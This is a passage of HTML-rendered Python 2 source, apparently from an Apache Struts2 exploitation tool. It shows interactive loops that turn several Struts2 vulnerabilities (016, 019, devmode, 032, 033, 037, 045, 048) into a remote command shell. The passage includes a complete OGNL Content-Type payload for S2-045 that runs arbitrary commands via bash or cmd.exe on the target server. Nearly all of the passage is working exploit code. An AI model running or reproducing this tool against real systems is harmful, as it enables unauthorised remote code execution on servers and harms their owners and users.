        <td id="LC231" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L232" class="blob-num js-line-number" data-line-number="232"></td>
        <td id="LC232" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L233" class="blob-num js-line-number" data-line-number="233"></td>
        <td id="LC233" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L234" class="blob-num js-line-number" data-line-number="234"></td>
        <td id="LC234" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L235" class="blob-num js-line-number" data-line-number="235"></td>
        <td id="LC235" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url</td>
      </tr>
      <tr>
        <td id="L236" class="blob-num js-line-number" data-line-number="236"></td>
        <td id="LC236" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.post(commurl, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-016<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command), <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L237" class="blob-num js-line-number" data-line-number="237"></td>
        <td id="LC237" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L238" class="blob-num js-line-number" data-line-number="238"></td>
        <td id="LC238" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L239" class="blob-num js-line-number" data-line-number="239"></td>
        <td id="LC239" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L240" class="blob-num js-line-number" data-line-number="240"></td>
        <td id="LC240" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L241" class="blob-num js-line-number" data-line-number="241"></td>
        <td id="LC241" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L242" class="blob-num js-line-number" data-line-number="242"></td>
        <td id="LC242" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L243" class="blob-num js-line-number" data-line-number="243"></td>
        <td id="LC243" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-019<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L244" class="blob-num js-line-number" data-line-number="244"></td>
        <td id="LC244" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L245" class="blob-num js-line-number" data-line-number="245"></td>
        <td id="LC245" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L246" class="blob-num js-line-number" data-line-number="246"></td>
        <td id="LC246" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L247" class="blob-num js-line-number" data-line-number="247"></td>
        <td id="LC247" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L248" class="blob-num js-line-number" data-line-number="248"></td>
        <td id="LC248" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L249" class="blob-num js-line-number" data-line-number="249"></td>
        <td id="LC249" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L250" class="blob-num js-line-number" data-line-number="250"></td>
        <td id="LC250" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url</td>
      </tr>
      <tr>
        <td id="L251" class="blob-num js-line-number" data-line-number="251"></td>
        <td id="LC251" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.post(commurl, <span class="pl-v">data</span><span class="pl-k">=</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-019<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command), <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L252" class="blob-num js-line-number" data-line-number="252"></td>
        <td id="LC252" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L253" class="blob-num js-line-number" data-line-number="253"></td>
        <td id="LC253" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L254" class="blob-num js-line-number" data-line-number="254"></td>
        <td id="LC254" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L255" class="blob-num js-line-number" data-line-number="255"></td>
        <td id="LC255" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L256" class="blob-num js-line-number" data-line-number="256"></td>
        <td id="LC256" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L257" class="blob-num js-line-number" data-line-number="257"></td>
        <td id="LC257" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L258" class="blob-num js-line-number" data-line-number="258"></td>
        <td id="LC258" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-devmode<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L259" class="blob-num js-line-number" data-line-number="259"></td>
        <td id="LC259" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L260" class="blob-num js-line-number" data-line-number="260"></td>
        <td id="LC260" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L261" class="blob-num js-line-number" data-line-number="261"></td>
        <td id="LC261" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L262" class="blob-num js-line-number" data-line-number="262"></td>
        <td id="LC262" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L263" class="blob-num js-line-number" data-line-number="263"></td>
        <td id="LC263" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L264" class="blob-num js-line-number" data-line-number="264"></td>
        <td id="LC264" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L265" class="blob-num js-line-number" data-line-number="265"></td>
        <td id="LC265" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-devmode<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command)</td>
      </tr>
      <tr>
        <td id="L266" class="blob-num js-line-number" data-line-number="266"></td>
        <td id="LC266" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.get(commurl, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L267" class="blob-num js-line-number" data-line-number="267"></td>
        <td id="LC267" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L268" class="blob-num js-line-number" data-line-number="268"></td>
        <td id="LC268" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L269" class="blob-num js-line-number" data-line-number="269"></td>
        <td id="LC269" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L270" class="blob-num js-line-number" data-line-number="270"></td>
        <td id="LC270" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L271" class="blob-num js-line-number" data-line-number="271"></td>
        <td id="LC271" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L272" class="blob-num js-line-number" data-line-number="272"></td>
        <td id="LC272" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L273" class="blob-num js-line-number" data-line-number="273"></td>
        <td id="LC273" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-032<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L274" class="blob-num js-line-number" data-line-number="274"></td>
        <td id="LC274" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L275" class="blob-num js-line-number" data-line-number="275"></td>
        <td id="LC275" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L276" class="blob-num js-line-number" data-line-number="276"></td>
        <td id="LC276" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L277" class="blob-num js-line-number" data-line-number="277"></td>
        <td id="LC277" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L278" class="blob-num js-line-number" data-line-number="278"></td>
        <td id="LC278" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L279" class="blob-num js-line-number" data-line-number="279"></td>
        <td id="LC279" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L280" class="blob-num js-line-number" data-line-number="280"></td>
        <td id="LC280" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-032<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command)</td>
      </tr>
      <tr>
        <td id="L281" class="blob-num js-line-number" data-line-number="281"></td>
        <td id="LC281" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.get(commurl, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L282" class="blob-num js-line-number" data-line-number="282"></td>
        <td id="LC282" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L283" class="blob-num js-line-number" data-line-number="283"></td>
        <td id="LC283" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L284" class="blob-num js-line-number" data-line-number="284"></td>
        <td id="LC284" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L285" class="blob-num js-line-number" data-line-number="285"></td>
        <td id="LC285" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L286" class="blob-num js-line-number" data-line-number="286"></td>
        <td id="LC286" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L287" class="blob-num js-line-number" data-line-number="287"></td>
        <td id="LC287" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L288" class="blob-num js-line-number" data-line-number="288"></td>
        <td id="LC288" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-033<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L289" class="blob-num js-line-number" data-line-number="289"></td>
        <td id="LC289" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L290" class="blob-num js-line-number" data-line-number="290"></td>
        <td id="LC290" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L291" class="blob-num js-line-number" data-line-number="291"></td>
        <td id="LC291" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L292" class="blob-num js-line-number" data-line-number="292"></td>
        <td id="LC292" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L293" class="blob-num js-line-number" data-line-number="293"></td>
        <td id="LC293" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L294" class="blob-num js-line-number" data-line-number="294"></td>
        <td id="LC294" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L295" class="blob-num js-line-number" data-line-number="295"></td>
        <td id="LC295" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-033<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command)</td>
      </tr>
      <tr>
        <td id="L296" class="blob-num js-line-number" data-line-number="296"></td>
        <td id="LC296" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.get(commurl, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L297" class="blob-num js-line-number" data-line-number="297"></td>
        <td id="LC297" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L298" class="blob-num js-line-number" data-line-number="298"></td>
        <td id="LC298" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L299" class="blob-num js-line-number" data-line-number="299"></td>
        <td id="LC299" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L300" class="blob-num js-line-number" data-line-number="300"></td>
        <td id="LC300" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L301" class="blob-num js-line-number" data-line-number="301"></td>
        <td id="LC301" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L302" class="blob-num js-line-number" data-line-number="302"></td>
        <td id="LC302" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L303" class="blob-num js-line-number" data-line-number="303"></td>
        <td id="LC303" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-037<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L304" class="blob-num js-line-number" data-line-number="304"></td>
        <td id="LC304" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L305" class="blob-num js-line-number" data-line-number="305"></td>
        <td id="LC305" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L306" class="blob-num js-line-number" data-line-number="306"></td>
        <td id="LC306" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L307" class="blob-num js-line-number" data-line-number="307"></td>
        <td id="LC307" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L308" class="blob-num js-line-number" data-line-number="308"></td>
        <td id="LC308" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L309" class="blob-num js-line-number" data-line-number="309"></td>
        <td id="LC309" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L310" class="blob-num js-line-number" data-line-number="310"></td>
        <td id="LC310" class="blob-code blob-code-inner js-file-line">                        commurl <span class="pl-k">=</span> <span class="pl-c1">self</span>.url<span class="pl-k">+</span><span class="pl-c1">self</span>.shell[<span class="pl-s"><span class="pl-pds">&#39;</span>struts2-037<span class="pl-pds">&#39;</span></span>].replace(<span class="pl-s"><span class="pl-pds">&quot;</span>FUZZINGCOMMAND<span class="pl-pds">&quot;</span></span>, command)</td>
      </tr>
      <tr>
        <td id="L311" class="blob-num js-line-number" data-line-number="311"></td>
        <td id="LC311" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.get(commurl, <span class="pl-v">headers</span><span class="pl-k">=</span>headers, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L312" class="blob-num js-line-number" data-line-number="312"></td>
        <td id="LC312" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L313" class="blob-num js-line-number" data-line-number="313"></td>
        <td id="LC313" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L314" class="blob-num js-line-number" data-line-number="314"></td>
        <td id="LC314" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L315" class="blob-num js-line-number" data-line-number="315"></td>
        <td id="LC315" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L316" class="blob-num js-line-number" data-line-number="316"></td>
        <td id="LC316" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L317" class="blob-num js-line-number" data-line-number="317"></td>
        <td id="LC317" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L318" class="blob-num js-line-number" data-line-number="318"></td>
        <td id="LC318" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-045<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L319" class="blob-num js-line-number" data-line-number="319"></td>
        <td id="LC319" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L320" class="blob-num js-line-number" data-line-number="320"></td>
        <td id="LC320" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L321" class="blob-num js-line-number" data-line-number="321"></td>
        <td id="LC321" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L322" class="blob-num js-line-number" data-line-number="322"></td>
        <td id="LC322" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L323" class="blob-num js-line-number" data-line-number="323"></td>
        <td id="LC323" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L324" class="blob-num js-line-number" data-line-number="324"></td>
        <td id="LC324" class="blob-code blob-code-inner js-file-line">                    headers_exp <span class="pl-k">=</span> {</td>
      </tr>
      <tr>
        <td id="L325" class="blob-num js-line-number" data-line-number="325"></td>
        <td id="LC325" class="blob-code blob-code-inner js-file-line">                         <span class="pl-s"><span class="pl-pds">&quot;</span>User-Agent<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L326" class="blob-num js-line-number" data-line-number="326"></td>
        <td id="LC326" class="blob-code blob-code-inner js-file-line">                         <span class="pl-s"><span class="pl-pds">&quot;</span>Accept<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*<span class="pl-pds">&quot;</span></span>,</td>
      </tr>
      <tr>
        <td id="L327" class="blob-num js-line-number" data-line-number="327"></td>
        <td id="LC327" class="blob-code blob-code-inner js-file-line">                         <span class="pl-s"><span class="pl-pds">&quot;</span>Content-Type<span class="pl-pds">&quot;</span></span>:<span class="pl-s"><span class="pl-pds">&quot;</span>%{(#nike=&#39;multipart/form-data&#39;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&#39;<span class="pl-pds">&quot;</span></span><span class="pl-k">+</span>command<span class="pl-k">+</span><span class="pl-s"><span class="pl-pds">&quot;</span>&#39;).(#iswin=(@java.lang.System@getProperty(&#39;os.name&#39;).toLowerCase().contains(&#39;win&#39;))).(#cmds=(#iswin?{&#39;cmd.exe&#39;,&#39;/c&#39;,#cmd}:{&#39;/bin/bash&#39;,&#39;-c&#39;,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}<span class="pl-pds">&quot;</span></span></td>
      </tr>
      <tr>
        <td id="L328" class="blob-num js-line-number" data-line-number="328"></td>
        <td id="LC328" class="blob-code blob-code-inner js-file-line">                    }</td>
      </tr>
      <tr>
        <td id="L329" class="blob-num js-line-number" data-line-number="329"></td>
        <td id="LC329" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">try</span>:</td>
      </tr>
      <tr>
        <td id="L330" class="blob-num js-line-number" data-line-number="330"></td>
        <td id="LC330" class="blob-code blob-code-inner js-file-line">                        req <span class="pl-k">=</span> requests.get(<span class="pl-c1">self</span>.url, <span class="pl-v">headers</span><span class="pl-k">=</span>headers_exp, <span class="pl-v">timeout</span><span class="pl-k">=</span><span class="pl-c1">6</span>, <span class="pl-v">verify</span><span class="pl-k">=</span><span class="pl-c1">False</span>)</td>
      </tr>
      <tr>
        <td id="L331" class="blob-num js-line-number" data-line-number="331"></td>
        <td id="LC331" class="blob-code blob-code-inner js-file-line">                        <span class="pl-c1">print</span> req.text</td>
      </tr>
      <tr>
        <td id="L332" class="blob-num js-line-number" data-line-number="332"></td>
        <td id="LC332" class="blob-code blob-code-inner js-file-line">                    <span class="pl-k">except</span>:</td>
      </tr>
      <tr>
        <td id="L333" class="blob-num js-line-number" data-line-number="333"></td>
        <td id="LC333" class="blob-code blob-code-inner js-file-line">                        cprint(<span class="pl-s"><span class="pl-pds">&quot;</span>命令执行失败!!!<span class="pl-pds">&quot;</span></span>, <span class="pl-s"><span class="pl-pds">&quot;</span>red<span class="pl-pds">&quot;</span></span>)</td>
      </tr>
      <tr>
        <td id="L334" class="blob-num js-line-number" data-line-number="334"></td>
        <td id="LC334" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">else</span>:</td>
      </tr>
      <tr>
        <td id="L335" class="blob-num js-line-number" data-line-number="335"></td>
        <td id="LC335" class="blob-code blob-code-inner js-file-line">                    sys.exit(<span class="pl-c1">1</span>)</td>
      </tr>
      <tr>
        <td id="L336" class="blob-num js-line-number" data-line-number="336"></td>
        <td id="LC336" class="blob-code blob-code-inner js-file-line">
</td>
      </tr>
      <tr>
        <td id="L337" class="blob-num js-line-number" data-line-number="337"></td>
        <td id="LC337" class="blob-code blob-code-inner js-file-line">        <span class="pl-k">if</span> pocname <span class="pl-k">==</span> <span class="pl-s"><span class="pl-pds">&quot;</span>struts2-048<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L338" class="blob-num js-line-number" data-line-number="338"></td>
        <td id="LC338" class="blob-code blob-code-inner js-file-line">            <span class="pl-k">while</span> <span class="pl-c1">True</span>:</td>
      </tr>
      <tr>
        <td id="L339" class="blob-num js-line-number" data-line-number="339"></td>
        <td id="LC339" class="blob-code blob-code-inner js-file-line">                <span class="pl-c1">print</span> prompt,</td>
      </tr>
      <tr>
        <td id="L340" class="blob-num js-line-number" data-line-number="340"></td>
        <td id="LC340" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> <span class="pl-v">raw_input</span>()</td>
      </tr>
      <tr>
        <td id="L341" class="blob-num js-line-number" data-line-number="341"></td>
        <td id="LC341" class="blob-code blob-code-inner js-file-line">                command <span class="pl-k">=</span> command.strip()</td>
      </tr>
      <tr>
        <td id="L342" class="blob-num js-line-number" data-line-number="342"></td>
        <td id="LC342" class="blob-code blob-code-inner js-file-line">                <span class="pl-k">if</span> command <span class="pl-k">!=</span> <span class="pl-s"><span class="pl-pds">&quot;</span>exit<span class="pl-pds">&quot;</span></span>:</td>
      </tr>
      <tr>
        <td id="L343" class="blob-num js-line-number" data-line-number="343"></td>
        <td id="LC343" class="blob-code blob-code-inner js-file-line">                    headers_exp <span class="pl-k">=</span> {</td>
      </tr>
